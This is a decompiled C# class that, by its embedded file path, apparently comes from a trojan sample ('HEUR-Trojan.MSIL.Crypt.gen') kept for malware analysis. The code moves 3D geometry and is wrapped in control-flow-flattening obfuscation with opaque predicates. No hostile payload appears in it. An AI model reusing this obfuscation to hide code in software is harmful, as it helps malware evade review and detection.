// Decompiled with JetBrains decompiler
// Type: DebuggerTypeProxyAttrib.Mappers.Process
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Collections;
using DebuggerTypeProxyAttrib.Pages;
using System.Runtime.CompilerServices;
using System.Windows.Media.Media3D;

namespace DebuggerTypeProxyAttrib.Mappers
{
  public class Process
  {
    public uint _Template;
    public Point3D m_Descriptor;
    public Vector3D _Candidate;
    public GeometryModel3D _Tag;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Process(uint i_amount)
    {
      int num1 = 4;
      if (!Process.PostAttribute())
        goto label_5;
label_1:
      RegistryPagePage.ListMethod();
      int num2 = 3;
label_4:
      num1 = num2;
label_5:
      switch (num1)
      {
        case 0:
        case 4:
          goto label_1;
        case 1:
        case 2:
          this._Template = i_amount;
          num2 = 5;
          goto label_4;
        case 3:
          // ISSUE: explicit constructor call
          base.\u002Ector();
          goto case 1;
        case 5:
          break;
        default:
          num2 = 1;
          goto label_4;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Process(
      uint sum_info,
      Point3D second,
      Vector3D helper,
      GeometryModel3D x2,
      GlobalErrorCollection visitor3)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              RegistryPagePage.ListMethod();
              int num3 = 4;
              num2 = Process.PostAttribute() ? num3 : num3;
              continue;
            case 1:
            case 4:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              this._Template = sum_info;
              num2 = 5;
              continue;
            case 2:
            case 3:
              goto label_8;
            case 5:
              goto label_2;
            case 6:
              goto label_7;
            default:
              goto label_5;
          }
        }
label_2:
        this.m_Descriptor = second;
        this._Candidate = helper;
        this._Tag = x2;
        goto label_8;
label_5:
        num1 = 2;
        continue;
label_8:
        visitor3._Rule.Add(this._Template, this);
        num1 = 6;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CompareOrder()
    {
      int num1 = 5;
      while (true)
      {
        int num2;
        TranslateTransform3D translateTransform3D;
        switch (num1)
        {
          case 0:
          case 2:
            this._Tag.Transform = (Transform3D) translateTransform3D;
            this.m_Descriptor.X += this._Candidate.X;
            this.m_Descriptor.Y += this._Candidate.Y;
            this.m_Descriptor.Z += this._Candidate.Z;
            goto case 4;
          case 1:
          case 3:
            translateTransform3D.OffsetX = this.m_Descriptor.X + this._Candidate.X;
            translateTransform3D.OffsetY = this.m_Descriptor.Y + this._Candidate.Y;
            translateTransform3D.OffsetZ = this.m_Descriptor.Z + this._Candidate.Z;
            if (Process.AwakeAttribute())
            {
              num1 = 0;
              continue;
            }
            goto case 0;
          case 4:
            this._Candidate.X = 0.0;
            this._Candidate.Y = 0.0;
            num1 = 6;
            continue;
          case 5:
            translateTransform3D = new TranslateTransform3D();
            num2 = 3;
            break;
          case 6:
            this._Candidate.Z = 0.0;
            num2 = 7;
            break;
          case 7:
            goto label_9;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
      }
label_9:;
    }

    internal static bool AwakeAttribute() => true;

    internal static bool PostAttribute() => false;
  }
}
